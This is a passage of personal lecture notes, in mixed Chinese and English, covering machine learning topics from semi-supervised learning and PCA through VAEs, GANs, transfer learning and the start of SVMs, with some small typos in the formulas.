{r=1}$</p><ul><li>E.g. $x^r$:image, $\hat{y}^{r}$:class labels</li></ul><p>Semi-supervised leaning: $\{(x^r,\hat{y}^r)^{R}_ {r=1}\}, \{x^u\}^{R+U}_ {u=R}$</p><ul><li>A set of unlabeled data, usually $U&gt;&gt;R$</li><li>Transductive learning: unlabeled data is the testing data</li><li>Inductive learning: unlabeled data is not the testing data</li></ul><p>Why semi-supervised learning</p><ul><li>Collecting data is easy, but collecting “labelled” data is expensive</li><li>We do semi-supervised learning in our lives</li></ul><p>Why semi-supervised learning helps?</p><ul><li>The distribution of the unlabeled data tell us something.<br>就是这些input的分布会影响结果的判断</li><li>Usually with some assumptions 通常伴随着一些假设</li></ul><h3 id="Semi-supervised-Learning-for-Generative-Model"><a href="#Semi-supervised-Learning-for-Generative-Model" class="headerlink" title="Semi-supervised Learning for Generative Model"></a>Semi-supervised Learning for Generative Model</h3><p>Supervised Generative Model<br>Given labelled training examples $x^r\in C_1,C_2$</p><ul><li>looking for most likely prior probability $P(C_i)$ and class-dependent probability $P(x|C_i)$</li><li>$P(x|C_i)$ is a Gaussian parameterized by $\mu^i$ and $\Sigma$</li></ul><p>Semi-supervised Generative Model</p><ul><li>Initialization:$\theta = \{P(C_1),P(C_2),\mu^{1},\mu^{2},\Sigma\}$</li><li>Step1(E): compute the posterior probability of unlabeled data $P_{\theta}(C_1|x^{u})$, Depending on model $\theta$</li><li>Step2(M): update model<br>$P(C_1)=\frac{N_1+\Sigma_{x^u}P(C_1|x^u)}{N}$.<br>$N$: total number of examples<br>$N_1$: number of examples belonging to $C_1$<br>$\mu^{1}=\frac{1}{N_1}\sum_{x^r\in C_1}x^r+\frac{1}{\sum_{x^u}P(C_1|x^u)}\sum_{x^u}P(C_1|x^u)x^u$</li><li>Back to step1</li></ul><p>The algorithm converges eventually, but the initialization influences the results.</p><p>Why?</p><ul><li>Maximum likelihood with labelled data(Closed-form solution)<br>$\log L(\theta)=\sum_{x^r}\log P_{\theta}(x^r,\hat{y}^r), P_{\theta}(x^r,\hat{y}^r)=P_{\theta}(x^r|\hat{y}^r)P(\hat{y}^r)$.</li><li>Maximum likelihood with labelled + unlabeled data(Solved iteratively)<br>$\log L(\theta)=\sum_{x^r}\log P_{\theta}(x^r,\hat{y}^r)+\sum_{x^u}\log P(\theta)(x^u), P_{\theta}(x^u)=P_{\theta}(x^u|C_1)P(C_1)+P_{\theta}(x^u|C_2)P(C_2)$, $x^u$ can come from either $C_1,C_2$.</li></ul><h3 id="Semi-supervised-Learning-Low-density-Separation"><a href="#Semi-supervised-Learning-Low-density-Separation" class="headerlink" title="Semi-supervised Learning - Low-density Separation"></a>Semi-supervised Learning - Low-density Separation</h3><h4 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h4><p>Given: labelled data set = $\{(x^r,\hat{y}^r)\}^{R}_ {r=1}$, unlabeled data set = $\{x^u\}^{R+U}_ {u=l}$<br>Repeat:</p><ul><li>Train model $f^{\ast}$ from labelled data set.(Independent to the model)</li><li>Apply $f^{\ast}$ to the unlabeled data set<ul><li>Obtain $\{x^u,y^u\}^{R+U}_ {u=l}$(Pseudo-label)</li></ul></li><li>Remove a set of data from unlabeled data set, and add them into the labeled data set<br>How to choose the data set remains open<br>You can also provide a weight to each data.</li></ul><p>Similar to semi-supervised learning for generative model<br>Hard label v.s. Soft lable<br>neural network的时候一定是用Hard label</p><h4 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h4><p>Entropy of $y^u$: Evaluate how concentrate the distribution $y^u$ is $E(y^u)=-\sum_{m}y^{u}_ {m}\ln (y^{u}_ {m})$, $m$: number of class. As small as possible.<br>$L=\sum_{x^r}C(y^r,y^r)+\lambda \sum_{x^u}E(y^u)$ 可微分，用Gradient Descent minimize，后面的可以让他不Overfitted</p><h3 id="Semi-supervosed-Learning-Smoothness-Assumption"><a href="#Semi-supervosed-Learning-Smoothness-Assumption" class="headerlink" title="Semi-supervosed Learning Smoothness Assumption"></a>Semi-supervosed Learning Smoothness Assumption</h3><p>近朱者赤，近墨者黑“You are knownby the companyyoukeep”</p><ul><li>Assumption: “similar” $x$ has the same $\hat{y}$</li><li>More precisely:<ul><li>x is not uniform.</li><li>If $x^1$ and $x^2$ are close in a high density region,$\hat{y}^1$ and $\hat{y}^2$ are the same.<br>connected by a high density path</li></ul></li></ul><p>Cluster and then label<br>Using all the data to learn a classifier as usual</p><p>Graph-based Approach<br>Represented the data points as a graph<br>Graph representation is nature sometimes.</p><p>定性使用<br>Graph-based Approach - Graph Construction</p><ul><li>Define the similarity $s(x^i,x^j)$ between $x^i$ and $x^j$</li><li>Add edge:<ul><li>K Nearest Neighbor</li><li>e-Neighborhood</li></ul></li><li>Edge weight is proportional to $s(x^i,x^j)$</li></ul><p>Gaussion Radial Basis Function<br>$s(x^i,x^j)=\exp (-\gamma || x^i-x^i ||^2)$</p><p>存在的问题<br>The labelled data influence their neighbors.<br>Propagate through the graph</p><p>定量使用</p><ul><li>Define the smoothness of the labels on the graph<br>$S=\frac{1}{2}\sum_{i,j}w_{i,j}(y^i-y^j)^2$ For all data(no matter labelled or not)<br>$\mathbf{y}$: (R+U)-dim vector.<br>$\mathbf{y}=[\cdots y^i \cdots y^j \cdots]^{T}$.<br>$L$:(R+U) x (R+U) matrix (Graph Laplacian).<br>$L = D - W$, $W$就是边权建出的图，$D$就是$W$每行的值求和放在$(i,i)$的位置<br>Then $S=\mathbf{y}^{T}L\mathbf{y}$,$y$ depenting on network parameters<br>原来Loss Function $L=\sum_{x^r}C(y^r,\hat{y}^r)+\lambda S$, As a regularization term</li></ul><h3 id="Semi-supervised-Learning-Better-Representation"><a href="#Semi-supervised-Learning-Better-Representation" class="headerlink" title="Semi-supervised Learning - Better Representation"></a>Semi-supervised Learning - Better Representation</h3><p>去蕪存菁，化繁為簡</p><ul><li>Find the latent factors behind the obvservation.</li><li>The latent factors (usually simpler) are better representations.</li></ul><h2 id="Unsupervised-Learning-Linear-Methods"><a href="#Unsupervised-Learning-Linear-Methods" class="headerlink" title="Unsupervised Learning - Linear Methods"></a>Unsupervised Learning - Linear Methods</h2><h3 id="Unsupercised-Learning"><a href="#Unsupercised-Learning" class="headerlink" title="Unsupercised Learning"></a>Unsupercised Learning</h3><p>两类</p><ul><li>Clustering &amp; Dimension Reduction(化繁为简)<br>only having function input.</li><li>Generation(无中生有)<br>only having function output.</li></ul><p>这节课主要是Linear 的 Dimension Reduction</p><h3 id="Clustering"><a href="#Clustering" class="headerlink" title="Clustering"></a>Clustering</h3><p>K-means</p><ul><li>Clustering $X=\{x^1, \cdots, x^n, \cdots, x^{N}\}$ into K clusters</li><li>Initalize cluster center $c^i, i=1,2,\cdots, K$(K random $x^n$ from X)</li><li>Repeat<br>For all $x^n$ in X: $b^n_i=\left\{\begin{matrix}1 &amp;x^n\text{ is most “close” to }c^i \\ 0 &amp;Otherwise \end{matrix}\right.$<br>Updating all $c^i$: $c^i=\sum_{x^n}b^n_ix^n/\sum_{x^n}b^n_i$</li></ul><p>Hierarchical Agglomerative Clustering(HAC)</p><ul><li>Step1: build a tree<br>建树过程是这样的，$n$个data，选两个最像的做平均连起来变成1个data，这样就有$n-1$个data，继续做下去就可以建一棵树</li><li>Step2: pick a threshold<br>在树上切一刀可以决定分成多少个Cluster</li></ul><h3 id="Distributed-Representation"><a href="#Distributed-Representation" class="headerlink" title="Distributed Representation"></a>Distributed Representation</h3><p>Clustering: an object must belong to one cluster<br>Distributed representation: 用一个vector每一维表示一个attribute<br>这个将一个object用Distribution representation表示，从高维空间变到低维空间，就是Dimension Reduction.</p><h3 id="Dimension-Reduction"><a href="#Dimension-Reduction" class="headerlink" title="Dimension Reduction"></a>Dimension Reduction</h3><p>找一个Function，输入一个高维的vector得到一个低微的vector</p><p>Feature selection： 把没用的Dimension去掉<br>Principle component analysis(PCA): $z=Wx$</p><h3 id="Principle-component-analysis-PCA"><a href="#Principle-component-analysis-PCA" class="headerlink" title="Principle component analysis(PCA)"></a>Principle component analysis(PCA)</h3><p>Principle component analysis(PCA)主成分分析<br>$z=Wx$<br>对于$z$每一维，都是$z_i=w^i \cdot x$<br>$var(z_i)=\sum_{z_i}(z_i-\bar{z_i})^2, ||w^i||_ 2=1$<br>$z_i$的variance越大越好<br>然后$w^i$要两两垂直<br>$W=\begin{bmatrix}(w^1)^{T} \\ (w^2)^{T} \\ \vdots \end{bmatrix}$.<br>$W$就是个 Orthogonal matrix 正交矩阵</p><p>Lagrange multiplier<br>$z_1=w^1\cdot x$<br>$\bar{z_1}=\sum z_1=\sum w^1\cdot x = w^1\sum x=w^1 \cdot x$.<br>$var(z_1)=\sum_{z_1}(z_1-\bar{z_1})^2=\sum_{x}(w^1\cdot x-w^1\cdot \bar{x})^2=\sum (w^1\cdot (x-\bar{x}))^2$.<br>$\because (a\cdot b)^2=(a^{T}b)^2=a^{T}ba^{T}b=a^{T}b(a^{T}b)^{T}=a^{T}bb^{T}a$.<br>$\therefore var(z_1)=\sum (w^1)^{T}(x-\bar{x})(x-\bar{x})^{T}w^1=(w^1)^{T}\sum (x-\bar{x})(x-\bar{x})^{T} w^1=(w^1)^{T}Cov(x)w^1$.<br>$Cov(x)$是$x$的covariance matrix<br>Let $S=Cov(x)$, Symmetric, positive-semidefinite,(non-negative eigenvalues)<br>Find $w^1$ maximizing $(w^1)^{T}Sw^1$.<br>Constraint: $||w^1||_ 2=(w^1)^{T}w^1=1$<br>Using Largrange multiplier<br>$g(w^1)=(w^1)^{T}Sw^1-\alpha ((w^1)^{T}w^1-1)$.<br>让$\partial g(w^1)/\partial w^1_1 =0,\partial g(w^1)/\partial w^1_2 =0,…$.<br>然后就得到解$Sw^1-\alpha w^1=0$，即$Sw^1=\alpha w^1$，$w^1$就是$S$的eigenvector 特征向量<br>$(w^1)^{T}Sw^1=\alpha (w^1)^{T}w^1=\alpha$ Choose the maximum one.</p><p>结论：$w^1$ is the eigenvector of the convariance matrix $S$, Corresponding to the largest eigenvalue $\lambda$ </p><p>Find $w^2$ maximizing $(w^2)^{T}Sw^2$, $(w^2)^{T}w^2=1,(w^2)^{T}w^1=0$.<br>$g(w^2)=(w^2)^{T}Sw^2-\alpha ((w^2)^{T}w^2-1)-\beta((w^2)^{T}w^1-0)$.<br>让$\partial g(w^2)/\partial w^2_1 =0,\partial g(w^2)/\partial w^2_2 =0,…$.<br>$Sw^2-\alpha w^2 - \beta w^1=0$<br>$(w^2)^{T}Sw^2-\alpha ((w^2)^{T}w^2-1)-\beta((w^2)^{T}w^1-0)=0$.<br>$((w^1)^{T}Sw^2)^{T}=(w^2)^{T}S^{T}w^1=(w^2)^{T}Sw^1=\lambda_1(w^2)^{T}w^1=0$.<br>所以$\beta=0: Sw^2-\alpha w^2=0, Sw^2=\alpha w^2$</p><p>结论：$w^2$ is the eigenvector of the convariance matrix $S$. Corresponding to the 2nd largest eigenvalue $\lambda_2$.</p><p>PCA - decorrelation<br>$z=Wx,Cov(z)=D$ $Cov(z)$是一个Diagonal matrix<br>$Cov(z)=\sum(z-\bar{z})(z-\bar{z})^{T}=WSW^{T}, S=Cov(x)$<br>$=WS[w^1 \cdots w^K]=W[Sw^1 \cdots Sw^K]=W[\lambda_1w^1 \cdots \lambda_Kw^K]=[\lambda_1Ww^2 \cdots \lambda_KWw^zk]=[\lambda_1e_1 \cdots \lambda_Ke_K]$, $e_K$是第$K$维是1其他是0</p><h3 id="PCA-Another-Point-of-View"><a href="#PCA-Another-Point-of-View" class="headerlink" title="PCA - Another Point of View"></a>PCA - Another Point of View</h3><p>Basic Component: 就是一些基本的组成，每一个都是一个vector, $u^K$<br>$x\approx c_1u^1+c_2u^2+\cdots + c_Ku^K+\bar{x}$<br>所以可以用$\begin{bmatrix}c_1\\ c_2\\ \vdots\\ c_K\end{bmatrix}$ represent a image $x$.</p><p>$x-\bar{x}\approx c_1u^1+c_2u^2+\cdots + c_Ku^K=\hat{x}$.<br>Reconstruction error: $||(x-\bar{x})-\hat{x}||_ 2$.<br>Find $\{u^1,\cdots, u^K\}$ minimizing the error.</p><script type="math/tex; mode=display">L=\min _ {\{u^1,\cdots ,u^K\}}\sum \left \| (x-\bar{x})-(\sum_{k=1}^{K}c_ku^k) \right \| _ 2</script><p>PCA求得$w^1,\cdots, w^K$其实就是$u^1,\cdots, u^K$，证明好像是线代相关SVD…感觉我们学的线代内容好基础…看不太懂233</p><p>PCA looks like a neural network with one hidden layer(linear activation function). Autoencoder<br>$\hat{x}=\sum_{k=1}^{K}c_kw^k=x-\bar{x}$.<br>To minimize reconstruction error: $c_k=(x-\bar{x})\cdot w^k$.<br>可以用一个neural network表示<br>It can be deep. Deep autoencoder.</p><h3 id="Weakness-of-PCA"><a href="#Weakness-of-PCA" class="headerlink" title="Weakness of PCA"></a>Weakness of PCA</h3><ul><li>Unsupervised</li><li>Linear</li></ul><p>LDA = linear discriminant analysis， 是supervised</p><h3 id="What-happens-to-PCA"><a href="#What-happens-to-PCA" class="headerlink" title="What happens to PCA?"></a>What happens to PCA?</h3><p>PCA involves adding up and subtracting some components(images)</p><ul><li>Then the components may not be “parts of digits”<br>Non-negative matrix factiorization(NMF)</li><li>Forcing $a_1,a_2,…$ be non-negative<ul><li>adaitive combination</li></ul></li><li>Forcing $w^1,w^2,…$ be non-negative<ul><li>More like “parts of digits”</li></ul></li></ul><h3 id="Matrix-Factorization"><a href="#Matrix-Factorization" class="headerlink" title="Matrix Factorization"></a>Matrix Factorization</h3><p>Minimizing $L=\sum(r^i\cdot r^j-n_{ij})^2$<br>Find $r^i,r^j$ by Gradient Descent.</p><p>More about Mareix Factorization</p><p>Considering the induvial characteristics<br>$r^A\cdot r^1\approx 5\rightarrow r^A\cdot b_A+b_1\approx 5$.<br>$b_A$: otakus A likes to by figures.<br>$b_1$: how popular character 1 is.<br>加了另外两个特征<br>Minimizing $L=\sum_{(i,j)}(r^i\cdot r^j + b_i + b_j -n_{ij})^2$.<br>Find $r^i,r^j,b_i,b_j$ by gradient descent(can add regularization)</p><ul><li>Ref: Matrix Factorization Techniques for Recommender Systems.</li></ul><p>Matrix Factorization for Topic analysis<br>在这方面的应用的方法叫做 Latent semantic analysis(LSA)</p><h2 id="Unsupervised-Learning-Word-Embedding"><a href="#Unsupervised-Learning-Word-Embedding" class="headerlink" title="Unsupervised Learning: Word Embedding"></a>Unsupervised Learning: Word Embedding</h2><h3 id="Word-Embedding"><a href="#Word-Embedding" class="headerlink" title="Word Embedding"></a>Word Embedding</h3><p>Machine learn the meaning of words from reading a lot of documents without supervision.<br>Genarating Word Vector is unsupervised.</p><p>A word can be understood by its context, You shall know a word by the company it keeps.</p><h3 id="How-to-exploit-the-context"><a href="#How-to-exploit-the-context" class="headerlink" title="How to exploit the context"></a>How to exploit the context</h3><p>Count based</p><ul><li>If two words $w_i$ and $w_j$ frequently co-occur, $V(w_i)$ and $V(w_j)$ would be close to each other</li><li>E.g. <a href="http://nlp.stanford.edu/project/glove" target="_blank" rel="noopener">Glove Vector</a></li><li>$V(w_i)\cdot V(w_j)$inner product和$N_{i,j}$ Number of times $w_i$ and $w_j$ in the same document越接近越好</li></ul><h4 id="Prediction-based"><a href="#Prediction-based" class="headerlink" title="Prediction based"></a>Prediction based</h4><ul><li>1-of-N encoding of the word $w_{i-1}$</li><li>Take out the input of the neurons in the first layer</li><li>Use it to represent a word $w$</li><li>Word vector, word embedding feature: $V(w)$</li><li>output: The probability for each word as the next word $w_i$</li></ul><p>Sharing Parameters<br>The weights with the $w_i,w_j$ should be the same.<br>Or, one word would have two word vectors. 我觉得应该是因为出现的位置不同嘛<br>这样做也不会让参数随着context的增长而过多<br>也就是<br>The length of $x_{i-1}$ and $x_{i-2}$ are both $|V|$, The length of $z$ is $|Z|$.<br>$z=W_1x_{i-2}+W_2x_{i-1}$, the weight matrix $W_1$ and $W_2$ are both $|Z|\times |V|$ matrices.<br>Let $W_1=W_2=W$, $z=W(x_{i-2}+x_{i-1})$</p><p>How to make $w_i$ equal to $w_j$<br>Given $w_i$ and $w_j$ the same initialization<br>$w_i\leftarrow w_i-\eta \frac{\partial C}{\partial w_i}-\eta \frac{\partial C}{\partial w_j},w_j\leftarrow w_j-\eta \frac{\partial C}{\partial w_j}-\eta \frac{\partial C}{\partial w_i}$</p><p>Prediction-based Training<br>就minimize和后面词汇的cross entropy</p><p>Prediction-based - Various Architectures</p><ul><li>Continuous bag of word(CBOW) model<br>用前后的匹配中间的 predicting the word given its context.</li><li>Skip-gram<br>predicting the context given a word</li></ul><p>Beyond Bag of Word</p><ul><li>To understand the meaning of a word sequence, the order of the words can not be ignored.</li></ul><h2 id="Unsupervised-Learning-Neighbor-Embedding"><a href="#Unsupervised-Learning-Neighbor-Embedding" class="headerlink" title="Unsupervised Learning: Neighbor Embedding"></a>Unsupervised Learning: Neighbor Embedding</h2><h3 id="Manifold-Learning"><a href="#Manifold-Learning" class="headerlink" title="Manifold Learning"></a>Manifold Learning</h3><p>Manifold Learning 流形学习<br>非线性的降维</p><p>Locally Linear Embedding (LLE)<br>$w_{ij}$ respesents the relation between $x^i$ and $x^j$<br>Find a set of $w_{ij}$ minimizing $\sum_{i} || x^i-\sum_{j}w_{ij}x^j||_ 2$<br>Then find the dimension reduction results $z^i$ and $z^j$ based on $w_{ij}$.<br>Keep $w_{ij}$ unchanged, find a set of $z^i$ minimizing $\sum_{i} || z^i-\sum_{j}w_{ij}z^j||_ 2$</p><p>老师用“在天愿为比翼鸟，在地愿为连理枝”比喻可太厉害了hhhhhhhh</p><h3 id="Laplacian-Eigenmaps"><a href="#Laplacian-Eigenmaps" class="headerlink" title="Laplacian Eigenmaps"></a>Laplacian Eigenmaps</h3><p>Graph-based approach<br>Distance defined by graph approximate the distance on manifold<br>Construct the data points as a graph<br>Dimension Reduction: If $x^1$ and $x^2$ are close in a high density region, $z^1$ and $z^2$ are close to each other.<br>smoothness: $S=\frac{1}{2}\sum_{i,j}w_{i,j}(z^i-z^j)^2$, constraints to $z$: If the dim of $z$ is $M$,$Span\{z^1, z^2, … z^N\} = R^M$，找的是Laplacian Matrix 的eignenvector<br>这里在Semi-supervised Learning讲过<br>然后再去做cluster，Spectral clustering: clustering on z</p><h3 id="T-distributed-Stochastic-Neighbor-Embedding-t-SNE"><a href="#T-distributed-Stochastic-Neighbor-Embedding-t-SNE" class="headerlink" title="T-distributed Stochastic Neighbor Embedding(t-SNE)"></a>T-distributed Stochastic Neighbor Embedding(t-SNE)</h3><p>T-distributed Stochastic Neighbor Embedding(t-SNE) t-分布领域嵌入算法<br>Problem of the previous approaches</p><ul><li>Similar data are close, but different data may collapse<br>只保证了相似的会很接近，但没保证不相似要远一些<br><img src="/img/note-ml/20190731160618.png" alt><br>KL divergence<br>Similarity Measure<br>$S(x^i,x^j)=\exp (-||x^i-x^j||_ {2})$.<br>SNE: $S’(z^i,z^j$=\exp(-||z^i-z^j||_ 2)$.<br>t-SNE: $S’(z^i,z^j)=1/1+||z^i-z^j||_ 2$.</li></ul><h2 id="Unsupervised-Learning-Deep-Auto-encoder"><a href="#Unsupervised-Learning-Deep-Auto-encoder" class="headerlink" title="Unsupervised Learning: Deep Auto-encoder"></a>Unsupervised Learning: Deep Auto-encoder</h2><h3 id="Auto-encoder"><a href="#Auto-encoder" class="headerlink" title="Auto-encoder"></a>Auto-encoder</h3><p>找一个NN encoder和NNdecoder，将input转成一个code再转回成input，就可以两个连起来一起train<br>中间的是Bottleneck later<br>the auto-encoder can be deep</p><p>应用<br>文字处理<br>图片搜索<br>Pre-training DNN</p><p>变种<br>de-noising auto-encoder<br>contractive auto-endoer</p><p>Auto-endoer for CNN<br>CNN - unpooling<br>记录一下maxmap其他位置全补零，或全填最大值</p><p>CNN - Deconvolution<br>Actually, deconvolution is convolution</p><h2 id="Unsupervised-Learning-Deep-Generative-Model"><a href="#Unsupervised-Learning-Deep-Generative-Model" class="headerlink" title="Unsupervised Learning - Deep Generative Model"></a>Unsupervised Learning - Deep Generative Model</h2><h3 id="Creation"><a href="#Creation" class="headerlink" title="Creation"></a>Creation</h3><p><a href="https://openai.com/blog/generative-models" target="_blank" rel="noopener">generative model</a></p><h3 id="PixelRNN"><a href="#PixelRNN" class="headerlink" title="PixelRNN"></a>PixelRNN</h3><p>To Create an image, generating a pixel each time<br>It difficult to evaluate generation.</p><h3 id="Variational-Autoencoder-VAE"><a href="#Variational-Autoencoder-VAE" class="headerlink" title="Variational Autoencoder (VAE)"></a>Variational Autoencoder (VAE)</h3><p><img src="/img/note-ml/20190802104618.png" alt></p><p>$m$是原来的encoder orginal code<br>$c$是noise<br>$\sigma$是The variance of noise is automatically learned<br>$e$是从normal distribution sample出来的值<br>注意要minimize的东西，如果不加前面的可能$\sigma$就是0了，让$\sigma$接近0，variance接近1</p><p>Why VAE？<br>Estimate the probability distribution.<br>用的方法就是Gasussian Mixture Model<br>$P(x)=\sum_{m} P(m)P(x|m)$.<br>$m\sim P(m)\text{(multinomial), m is a integer}$.<br>$x|m\sim N(\mu^m,\Sigma^m)$.<br>Each x you generate is from a mixture.<br>Distributed representation is better than cluster.<br>$z\sim N(0,I)$. $z$ is a vector from normal distribution.<br>$x|z\sim N(\mu(z),\sigma(z))$. Each dimension of $z$ represents an attribute. $\mu(z),\sigma(z)$ is going to be estimated, 可以用Neural Network来找这个function<br>$P(x)=\int_{z}P(z)P(x|z)\text{d}z$.<br>$L=\sum_{z}\log P(x)$. Maximizing the likelihood of the observed $x$.<br>Tuning the parameters to maximize likelihood $L$.<br>Another distribution $q(z|x)$，$z|x=N(\mu’(x),\sigma’(x))$. 这是一个相反的Network，这是VAE的encoder，上面的是decoder</p><p>Maximizing Likelihood<br>$P(x)=\int_{z}P(z)P(x|z)\text{d}z$.<br>$L=\sum_{z}\log P(x)$<br>$\log P(x)=\int_{z}q(z|x)\log P(x)\text{d}z=\int_{z}q(z|x)\log\left (\frac{P(z,x)}{P(z|x)}\right )\text{d}z$. $q(z|x)$ can be any distribution<br>$=\int_{z}q(z|x)\log\left( \frac{P(z,x)}{q(z|x)}\frac{q(z|x)}{P(z|x)} \right )\text{d}z$.<br>$=\int_{z}q(z|x)\log\left ( \frac{P(z,x)}{q(z|x)}\right )\text{d}z+\int_{z}q(z|x)\log\left ( \frac{q(z|x)}{P(z|x)}\right )\text{d}z$. 最后一项，是KL divergence, $KL(q(z|x)|| P(z|x)) \geqslant 0$<br>$\geqslant \int_{z}q(z|x)\log \left( \frac{P(x|z)P(z)}{q(z|x)}\right )$. lower bound $L_b$，就是上一行的第一项<br>所以<br>$\log P(x)=L_b+KL(q(z|x)||P(z|x))$.<br>$L_b=\int_{z}q(z|x)\log \left (\frac{P(x|z)P(z)}{q(z|x)} \right )\text{d}z$. Find $P(x|z)$ and $q(z|x)$ maximizing $L_b$.<br>$q(z|x)$ will be an approximation of $P(z|x)$ in the end.<br>$L_b=\int_{z}q(z|x)\log \left (\frac{P(x|z)P(z)}{q(z|x)} \right )\text{d}z$.<br>$=\int_{z}q(z|x)\log P(x|z)\text{d}z+\int_{z}q(z|x)\log \left ( \frac{P(z)}{q(z|x)}\right )\text{d}z$. $KL(q(z|x) || P(z))$.<br>Minimizing $KL(q(z|x)||P(z))$, $q(z|x)$是在一个Neural Network里面的，这个相当于VAE中Minimize $\sum{i=1}^{3}(\exp (\sigma_i)-(1+\sigma_i)+(m_i)^2)$.<br>Maximizing $\int_{z}q(z|x)\log P(x|z)\text{d}z=E_{q(z|x)}[\log P(x|z)]$<br><img src="/img/note-ml/20190806085543.png" alt><br>这是Auto-encoder做的事情，让输入和输出越接近越好.</p><p>Conditional VAE<br>抽出特征生成风格的图片</p><p>Problem of VAE<br>It does not really try to simulate real images.<br>VAE may just memorize the existing images, instead of generating new images.</p><h3 id="Generative-Adversarial-Network-GAN"><a href="#Generative-Adversarial-Network-GAN" class="headerlink" title="Generative Adversarial Network (GAN)"></a>Generative Adversarial Network (GAN)</h3><p>最早论文 Ian J. Good fellow,Jean Pouget-Abadie,Mehdi Mirza,Bing Xu,David Warde-Farley,Sherjil Ozair,Aaron Courville,Yoshua Bengio, Generative Adversarial Networks, arXivpreprint 2014</p><p>GAN 分为两个部分，Generator 和 Discriminator.<br>Generator从未看过real data，来生成一组图片<br>Discriminator看过，它来做一个二元分类的问题，来判断Generator生成的data是否是real data(real or fake)<br>这时候再来train generator， “Tuning” the parameters of generator， 希望让 The output be classified as “real” (as close to 1 as possible)，这时候也要让Discriminator的参数fix保持不变，以此往复。</p><p>目前存在的问题就是，可以骗过Discriminator的图片，不一定是真的图片，可能是一些奇怪的东西<br>还有就是Generator可能太弱，却依然可以骗过Discriminator</p><h2 id="Transfer-Learning"><a href="#Transfer-Learning" class="headerlink" title="Transfer Learning"></a>Transfer Learning</h2><p>Transfer Learning 迁移学习<br>Data not directly related to the task considered.</p><p>Why? 一般原因都是数据难收集比较少之类的</p><p><img src="/img/note-ml/20190806110040.png" alt><br>Target Data是我们真正要的Data，Source Data是没有直接关系的Data<br>根据有无label分为4种情况，分别用对应的方法</p><h3 id="Model-Fine-tuning"><a href="#Model-Fine-tuning" class="headerlink" title="Model Fine-tuning"></a>Model Fine-tuning</h3><ul><li>Task description<ul><li>Target data: $(x^t, y^t)$. Very little</li><li>Source data: $(x^s, y^s)$. A large amount<br>One-shot learning: only a few examples in target domain</li></ul></li><li>Example: (supervised) speaker adaption<ul><li>Target data: audio data and its transcriptions of specific user</li><li>Source data: audio data and transcriptions from many speakers</li></ul></li><li>Idea: training a model by source data, then fine-tune the model by target data</li><li>Challenge: only limited target data, so be careful about overfitting</li></ul><p>Conservative Training<br><img src="/img/note-ml/20190806111041.png" alt><br>让两个Model的output相近</p><p>Layer Transfer<br><img src="/img/note-ml/20190806111243.png" alt><br>把几个Layer直接copy，光去train没有被copy的Layer，考虑的参数比较少<br>Which layer can be transferred (copied)?</p><ul><li>Speech: usually copy the last few layers</li><li>Image: usually copy the first few layers</li></ul><h3 id="Multitask-Learning"><a href="#Multitask-Learning" class="headerlink" title="Multitask Learning"></a>Multitask Learning</h3><p>The multi-layer structure makes NN suitable for multitake learning.<br>不同的task有几个相同的Layer共用</p><p>常用的方向就是多语言辨识</p><p>Progressive Neural Networks</p><h3 id="Domain-adversarial-training"><a href="#Domain-adversarial-training" class="headerlink" title="Domain-adversarial training"></a>Domain-adversarial training</h3><p>Task description</p><ul><li>Source data: $(x^s, y^s)$. Training Data.</li><li>Target data: $(x^t)$. Testing Data. They are mismatched.</li></ul><p>Similar to GAN. 需要通过一个Domain classifier.<br><img src="/img/note-ml/20190806115242.png" alt><br>训练过程<br><img src="/img/note-ml/20190806115830.png" alt></p><h3 id="Zero-shot-Learning"><a href="#Zero-shot-Learning" class="headerlink" title="Zero-shot Learning"></a>Zero-shot Learning</h3><p>Task description</p><ul><li>Source data: $(x^s, y^s)$. Training Data.</li><li>Target data: $(x^t)$. Testing Data. They are different tasks.</li></ul><p>具体就是把Attribute embedding，然后在查database，让一个物品的图和他这类物品的attribute接近，两个function投影到embedding space上，也就是两个NN投影后的结果越接近越好。</p><p>Training Target: $f(x^n)$ and $g(y^n)$ as close as possible.</p><p>What if we don’t have database ? 换Attribute成Word vector.</p><p>$f^{\ast}, g^{\ast}=\arg \min_ {f,g}\sum_{n} || f(x^n)-g(y^n) ||_ {2}$. 这样是不行的，需要修改成下面的样子<br>$f^{\ast}, g^{\ast}=\arg \min_ {f,g}\sum_{n} \max (0, k-f(x^n)\cdot g(y^n) + \max_ {m\neq n} f(x^n)\cdot g(y^m)), k\text{ Margin you define}$.<br>Zero Loss: $k-f(x^n)\cdot g(y^n) + \max_ {m\neq n} f(x^n)\cdot g(y^m) &lt; 0$.<br>$f(x^n)\cdot g(y^n) - \max_ {m\neq n} f(x^n)\cdot g(y^m)&gt;k$. 把相对应的接近，不相对应的拆散</p><p>Convex Combination of Semantic Embedding</p><p>Example 就是语言的翻译，可以翻译一个从未见过的翻译方向，但翻译的两个语言都有其他语言翻译过</p><h2 id="Support-Vector-Machine-SVM"><a href="#Support-Vector-Machine-SVM" class="headerlink" title="Support Vector Machine(SVM)"></a>Support Vector Machine(SVM)</h2><p>Hinge Loss + Kernel Method = Support Vector Machine(SVM) 支持向量机</p><h3 id="Hinge-Loss"><a href="#Hinge-Loss" class="headerlink" title="Hinge Loss"></a>Hinge Loss</h3><p><img src="/img/note-ml/20190807094809.png" alt><br>Hinge Loss就是最上面的那个Loss Function $l(f(x^n), \hat{y}^n)=\max (0, 1-\hat{y}^nf(x^n))$</p><h3 id="Linear-SVM"><a href="#Linear-SVM" class="headerlink" title="Linear SVM"></a>Linear SVM</h3><p>Step1: Function(Model)<br>$f(x)=\sum_{i}w_ix_i+b=\begin{bmatrix}w\\ b\end{bmatrix}\cdot \begin{bmatrix}x\\ 1\end{bmatrix}=w^{T}x$.<br>这里把第一个向量看成新的$w$，第二个向量看成是$x$.</p><p>Step2: Loss Function<br>$L(f)=\sum_{n}l(f(x^n), \hat{y}^n)+\lambda \begin{Vmatrix}w\end{Vmatrix}_ 2$.<br>$l(f(x^n), \hat{y}^n)=\max (0, 1-\hat{y}^nf(x^n))$.<br>是一个convex function</p><p>Step3: Gradient Descent<br>$\frac{\partial l(f(x^n), \hat{y}^n)}{\partial w_i}=\frac{\partial l(f(x^n), \hat{y}^n)}{\partial f(x^n)}\frac{\partial f(x^n)}{\partial w_i}$.<br>因为$f(x^n)=w^{T}\cdot x^n$.后面那项的值自然就是$x^n_i$.<br>而前面那项<br>$\frac{\partial \max(0, 1-\hat{y}^nf(x^n))}{\partial f(x^n)}=\left\{\begin{matrix}-\hat{y}^n, &amp; \hat{y}^nf(x^n)<1 